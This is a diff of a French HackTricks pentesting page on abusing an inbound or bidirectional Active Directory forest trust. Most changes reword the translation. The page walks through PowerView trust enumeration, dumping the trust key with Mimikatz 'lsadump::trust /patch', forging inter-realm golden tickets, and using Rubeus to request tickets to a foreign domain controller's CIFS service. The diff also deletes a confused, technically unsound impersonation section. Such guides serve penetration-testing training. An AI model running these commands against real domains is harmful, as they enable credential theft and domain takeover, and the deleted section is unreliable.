@@ -1,36 +1,36 @@
-# Domaine forestier externe - Unidirectionnel (entrant) ou bidirectionnel
+# Domaine forestier externe - Un sens (entrant) ou bidirectionnel
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-Dans ce scénario, un domaine externe vous fait confiance (ou les deux se font confiance), vous pouvez donc obtenir un certain type d'accès dessus.
+Dans ce scénario, un domaine externe vous fait confiance (ou les deux se font mutuellement confiance), vous permettant ainsi d'obtenir un certain type d'accès sur celui-ci.
 
 ## Énumération
 
-Tout d'abord, vous devez **énumérer** la **confiance** :
+Tout d'abord, vous devez **énumérer** la **confiance**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
 TrustType       : WINDOWS-ACTIVE_DIRECTORY
-TrustAttributes : 
+TrustAttributes :
 TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 
 # Get name of DC of the other domain
 Get-DomainComputer -Domain domain.external -Properties DNSHostName
-dnshostname           
------------           
+dnshostname
+-----------
 dc.domain.external
 
 # Groups that contain users outside of its domain and return its members
@@ -41,7 +41,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -63,14 +63,14 @@ SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
 IsGroup      : True
 IsDomain     : True
 
-# You may also enumerate where foreign groups and/or users have been assigned 
+# You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Dans l'énumération précédente, il a été découvert que l'utilisateur **`crossuser`** est membre du groupe **`External Admins`** qui a un accès **Admin** dans le **DC du domaine externe**.
+Dans l'énumération précédente, il a été découvert que l'utilisateur **`crossuser`** est membre du groupe **`External Admins`** qui a un **accès administratif** dans le **DC du domaine externe**.
 
-## Accès initial
+## Accès Initial
 
-Si vous n'avez trouvé **aucun accès spécial** de votre utilisateur dans l'autre domaine, vous pouvez toujours revenir à la méthodologie AD et essayer de **privesc à partir d'un utilisateur non privilégié** (comme le kerberoasting par exemple) :
+Si vous n'avez trouvé aucun accès **spécial** de votre utilisateur dans l'autre domaine, vous pouvez toujours revenir à la méthodologie AD et essayer de **privilégier un utilisateur non privilégié** (des choses comme le kerberoasting par exemple) :
 
 Vous pouvez utiliser les fonctions **Powerview** pour **énumérer** l'**autre domaine** en utilisant le paramètre `-Domain` comme ceci :
 ```powershell
@@ -80,15 +80,15 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Connexion
 
-En utilisant une méthode régulière avec les identifiants de l'utilisateur qui a accès au domaine externe, vous devriez être en mesure d'accéder :
+En utilisant une méthode classique avec les identifiants de l'utilisateur qui a accès au domaine externe, vous devriez pouvoir accéder :
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abus de l'historique SID
 
-Vous pouvez également abuser de l'[**historique SID**](sid-history-injection.md) à travers une confiance de forêt.
+Vous pourriez également abuser de l'[**historique SID**](sid-history-injection.md) à travers une confiance inter-forêts.
 
-Si un utilisateur est migré **d'une forêt à une autre** et que **la filtration SID n'est pas activée**, il devient possible d'**ajouter un SID de l'autre forêt**, et ce **SID** sera **ajouté** au **jeton de l'utilisateur** lors de l'authentification **à travers la confiance**.
+Si un utilisateur est migré **d'un domaine à un autre** et que **le filtrage SID n'est pas activé**, il devient possible d'**ajouter un SID de l'autre domaine**, et ce **SID** sera **ajouté** au **jeton de l'utilisateur** lors de l'authentification **à travers la confiance**.
 
 {% hint style="warning" %}
 Pour rappel, vous pouvez obtenir la clé de signature avec
@@ -97,7 +97,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Vous pourriez **signer avec** la clé **de confiance** un **TGT se faisant passer pour** l'utilisateur du domaine actuel.
+Vous pourriez **signer avec** la clé **de confiance** un **TGT se faisant passer** pour l'utilisateur du domaine actuel.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -109,26 +109,6 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 ### Impersonation complète de l'utilisateur
-
----
-
-#### Description
-
-Dans cette méthode, nous allons créer un utilisateur dans notre domaine qui aura les mêmes informations d'identification que l'utilisateur que nous voulons impersonner. Ensuite, nous allons configurer une relation d'approbation unidirectionnelle entre notre domaine et le domaine cible. Enfin, nous allons utiliser l'utilisateur que nous avons créé pour nous connecter au domaine cible.
-
-#### Étapes
-
-1. Créez un nouvel utilisateur dans votre domaine avec les mêmes informations d'identification que l'utilisateur que vous voulez impersonner.
-
-2. Configurez une relation d'approbation unidirectionnelle entre votre domaine et le domaine cible. La relation doit être configurée de manière à ce que votre domaine soit le domaine parent et le domaine cible soit le domaine enfant.
-
-3. Utilisez l'utilisateur que vous avez créé pour vous connecter au domaine cible. Vous devriez maintenant avoir un accès complet en tant qu'utilisateur cible.
-
-#### Remarques
-
-- Cette méthode nécessite des privilèges d'administration sur votre domaine et sur le domaine cible.
-
-- Cette méthode peut être détectée en surveillant les événements d'audit sur le domaine cible.
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -146,10 +126,10 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
-* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
